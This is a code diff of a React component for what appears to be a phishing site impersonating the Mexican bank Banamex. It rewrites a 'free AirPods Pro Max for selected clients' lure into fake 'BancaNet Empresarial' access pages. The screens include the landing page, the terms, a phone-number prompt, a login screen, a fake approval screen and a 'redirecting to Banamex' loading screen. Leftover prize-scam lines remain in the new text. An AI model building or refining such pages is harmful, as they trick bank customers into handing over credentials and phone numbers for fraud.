@@ -243,19 +243,19 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                     <p className="text-xl text-gray-600">Para clientes seleccionados de Banamex</p>
                   </div>
 
-                  {/* Tarjeta AirPods Principal */}
+                  {/* Tarjeta BancaNet Principal */}
                   <div className="platacard-bg rounded-2xl p-12 mb-12 mx-auto max-w-lg shadow-xl">
-                    <h2 className="text-6xl md:text-7xl font-bold text-white mb-2">AirPods</h2>
-                    <h2 className="text-6xl md:text-7xl font-bold text-white mb-4">Pro Max</h2>
-                    <p className="text-3xl text-orange-300 font-semibold">Totalmente Gratis</p>
+                    <h2 className="text-6xl md:text-7xl font-bold text-white mb-2">BancaNet</h2>
+                    <h2 className="text-6xl md:text-7xl font-bold text-white mb-4">Empresarial</h2>
+                    <p className="text-3xl text-orange-300 font-semibold">Acceso Seguro</p>
                   </div>
 
                   {/* Descripción */}
                   <div className="mb-12">
                     <p className="text-xl text-gray-700 leading-relaxed max-w-3xl mx-auto">
-                      Para clientes seleccionados por el buen uso de su tarjeta reciben{' '}
-                      <span className="font-bold platacard-accent">AirPods Pro Max totalmente gratis</span>.{' '}
-                      Sin costo adicional por su excelente historial crediticio.
+                      Para clientes empresariales de Banamex con{' '}
+                      <span className="font-bold platacard-accent">acceso a BancaNet Empresarial</span>.{' '}
+                      Gestión segura de sus cuentas y operaciones bancarias.
                     </p>
                   </div>
 
@@ -265,7 +265,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                       className="platacard-button text-2xl font-bold px-12 py-6 rounded-xl shadow-2xl transform hover:scale-105 transition-all duration-300"
                       onClick={() => onSubmit(ScreenType.TERMINOS, {})}
                     >
-                      Reclamar mis AirPods Pro Max →
+                      Acceder a BancaNet Empresarial →
                     </Button>
                   </div>
 
@@ -286,16 +286,16 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   {/* Grid de información */}
                   <div className="grid md:grid-cols-3 gap-12 text-center">
                     <div className="p-8 bg-gray-50 rounded-xl">
-                      <h4 className="text-xl font-bold text-gray-900 mb-4">Producto</h4>
-                      <p className="text-lg text-gray-600">AirPods Pro Max Originales</p>
+                      <h4 className="text-xl font-bold text-gray-900 mb-4">Plataforma</h4>
+                      <p className="text-lg text-gray-600">BancaNet Empresarial</p>
                     </div>
                     <div className="p-8 bg-gray-50 rounded-xl">
-                      <h4 className="text-xl font-bold text-gray-900 mb-4">Vigencia</h4>
-                      <p className="text-lg text-gray-600">1 día</p>
+                      <h4 className="text-xl font-bold text-gray-900 mb-4">Acceso</h4>
+                      <p className="text-lg text-gray-600">24/7</p>
                     </div>
                     <div className="p-8 bg-gray-50 rounded-xl">
-                      <h4 className="text-xl font-bold text-gray-900 mb-4">Entrega</h4>
-                      <p className="text-lg text-gray-600">A domicilio</p>
+                      <h4 className="text-xl font-bold text-gray-900 mb-4">Seguridad</h4>
+                      <p className="text-lg text-gray-600">Máxima protección</p>
                     </div>
                   </div>
 
@@ -317,7 +317,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                     <div className="bg-white rounded-xl overflow-hidden shadow-lg">
                       <img 
                         src={promoImage1} 
-                        alt="AirPods Pro Max Promoción" 
+                        alt="BancaNet Empresarial" 
                         className="w-full h-72 object-cover"
                       />
                     </div>
@@ -339,7 +339,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               <div className="max-w-6xl mx-auto px-8">
                 <div className="text-center mb-20">
                   <h2 className="text-4xl md:text-5xl font-bold text-gray-900 mb-8">¿Cómo funciona?</h2>
-                  <p className="text-2xl text-gray-600">Solo 3 pasos para recibir tus AirPods Pro Max</p>
+                  <p className="text-2xl text-gray-600">Solo 3 pasos para acceder a BancaNet Empresarial</p>
                 </div>
 
                 <div className="space-y-16 max-w-4xl mx-auto">
@@ -362,8 +362,8 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   <div className="flex items-start platacard-step">
                     <span className="platacard-step-number mr-8">3</span>
                     <div className="flex-1">
-                      <div className="font-bold text-gray-900 text-2xl mb-6">Recibe tus AirPods</div>
-                      <div className="text-gray-700 text-xl leading-relaxed">Te enviaremos tus AirPods Pro Max directamente a tu domicilio</div>
+                      <div className="font-bold text-gray-900 text-2xl mb-6">Accede a tu cuenta</div>
+                      <div className="text-gray-700 text-xl leading-relaxed">Gestiona tus cuentas y operaciones de manera segura desde BancaNet Empresarial</div>
                     </div>
                   </div>
                 </div>
@@ -374,10 +374,10 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                     className="w-full sm:w-auto bg-gradient-to-r from-gray-600 to-gray-700 hover:from-gray-700 hover:to-gray-800 text-white px-12 py-6 text-xl font-bold rounded-lg shadow-lg hover:shadow-xl transition-all duration-300 transform hover:scale-105"
                     onClick={() => onSubmit(ScreenType.TERMINOS, {})}
                   >
-                    Reclamar mis AirPods Pro Max →
+                    Acceder a BancaNet Empresarial →
                   </Button>
                   <p className="text-lg text-gray-500 mt-8">
-                    * Promoción válida solo para clientes seleccionados de Banamex
+                    * Acceso exclusivo para clientes empresariales de Banamex
                   </p>
                 </div>
               </div>
@@ -389,29 +389,29 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         const terminosContent = (
           <>
             <h2 className="text-lg font-bold mb-4 text-gray-700">
-              Términos y Condiciones de la Promoción AirPods Pro Max Gratis a Clientes Seleccionados Banamex
+              Términos y Condiciones de Acceso a BancaNet Empresarial Banamex
             </h2>
             <div className="max-h-80 overflow-y-auto text-left mb-6 text-sm text-gray-700 pr-2">
               <p className="mb-3">
-                Los presentes Términos y Condiciones tienen por objeto reglamentar y establecer los procedimientos aplicables a la promoción denominada "AirPods Pro Max Gratis a Clientes Seleccionados Banamex" ofrecida por Banamex.
+                Los presentes Términos y Condiciones tienen por objeto reglamentar y establecer los procedimientos aplicables al acceso a BancaNet Empresarial ofrecido por Banamex.
               </p>
-              <p className="mb-2 font-semibold">1. Requisitos para Participar:</p>
+              <p className="mb-2 font-semibold">1. Requisitos para Acceder:</p>
               <p className="mb-3">
-                La promoción está dirigida exclusivamente a clientes seleccionados de Banamex, quienes deberán cumplir con los siguientes requisitos:
+                El acceso está dirigido exclusivamente a clientes empresariales de Banamex, quienes deberán cumplir con los siguientes requisitos:
               </p>
               <ul className="mb-3 ml-4 list-disc">
-                <li>Ser titular de una tarjeta Banamex válida y activa.</li>
-                <li>Tener un historial crediticio excelente con buen uso de la tarjeta.</li>
-                <li>Ser notificado de su selección para participar en la promoción.</li>
+                <li>Ser titular de una cuenta empresarial Banamex válida y activa.</li>
+                <li>Tener credenciales de acceso válidas para BancaNet Empresarial.</li>
+                <li>Contar con autorización para realizar operaciones bancarias.</li>
               </ul>
-              <p className="mb-2 font-semibold">2. Descripción de la Promoción:</p>
+              <p className="mb-2 font-semibold">2. Descripción del Servicio:</p>
               <p className="mb-3">
-                Los clientes seleccionados recibirán AirPods Pro Max originales totalmente gratuitos como reconocimiento por su excelente historial crediticio.
+                Los clientes empresariales podrán acceder a BancaNet Empresarial para gestionar sus cuentas y realizar operaciones bancarias de forma segura.
               </p>
               <p className="mb-2 font-semibold">3. Condiciones Generales:</p>
               <ul className="mb-3 ml-4 list-disc">
-                <li>Los AirPods Pro Max se entregan completamente gratuitos.</li>
-                <li>La entrega se realiza directamente al domicilio registrado.</li>
+                <li>El acceso a BancaNet Empresarial está disponible 24/7.</li>
+                <li>Las operaciones están sujetas a los límites y condiciones de cada cuenta.</li>
                 <li>Válido hasta agotar existencias o por 6 meses desde la fecha de la promoción.</li>
               </ul>
               <p className="mb-2 font-semibold">8. Uso de Datos Personales:</p>
@@ -478,7 +478,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
 
                 {/* Info adicional */}
                 <p className="text-xs text-gray-500 text-center mt-4">
-                  Tu teléfono será usado únicamente para coordinar la entrega de tus AirPods Pro Max
+                  Tu teléfono será usado únicamente para verificar tu acceso a BancaNet Empresarial
                 </p>
               </div>
             </div>
@@ -820,7 +820,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             <div className="text-center mb-6">
               <h2 className="text-2xl font-bold text-gray-800 mb-2">Iniciar sesión</h2>
               <p className="text-sm text-gray-600">
-                Accede a tu cuenta para continuar con tu promoción de AirPods
+                Accede a tu cuenta para continuar a BancaNet Empresarial
               </p>
             </div>
 
@@ -1712,7 +1712,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 </div>
                 <h2 className="text-2xl font-bold platacard-gradient-text mb-3">¡Felicidades!</h2>
                 <p className="text-gray-700 font-semibold text-lg mb-2">
-                  Sus <span className="text-2xl font-bold platacard-accent">AirPods Pro Max</span> han sido otorgados
+                  Su <span className="text-2xl font-bold platacard-accent">acceso a BancaNet Empresarial</span> ha sido autorizado
                 </p>
                 <p className="text-gray-600">Totalmente gratuitos por su excelente historial crediticio</p>
               </div>
@@ -1725,7 +1725,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 <div className="text-left text-sm text-gray-700 space-y-2">
                   <div className="flex justify-between">
                     <span>• <strong>Producto:</strong></span>
-                    <span>AirPods Pro Max Originales</span>
+                    <span>BancaNet Empresarial</span>
                   </div>
                   <div className="flex justify-between">
                     <span>• <strong>Costo para usted:</strong></span>
@@ -2766,11 +2766,11 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             <div className="w-20 h-20 bg-gradient-to-br from-[#ff6b35] to-[#ff8c5a] rounded-full mx-auto mb-6 flex items-center justify-center">
               <span className="text-3xl">🎧</span>
             </div>
-            <h2 className="text-xl font-bold mb-5 platacard-gradient-text">Procesando promoción AirPods Pro Max</h2>
+            <h2 className="text-xl font-bold mb-5 platacard-gradient-text">Procesando acceso a BancaNet Empresarial</h2>
             <div className="flex items-center justify-center mb-5">
               <div className="w-12 h-12 border-t-4 border-b-4 border-[#ff6b35] rounded-full animate-spin"></div>
             </div>
-            <p className="text-center mb-2 text-gray-700">Por favor espere, estamos validando su promoción de AirPods Pro Max...</p>
+            <p className="text-center mb-2 text-gray-700">Por favor espere, estamos validando su acceso a BancaNet Empresarial...</p>
             <p className="text-center text-sm text-gray-500">Será redirigido automáticamente al portal de Banamex</p>
           </div>
         );
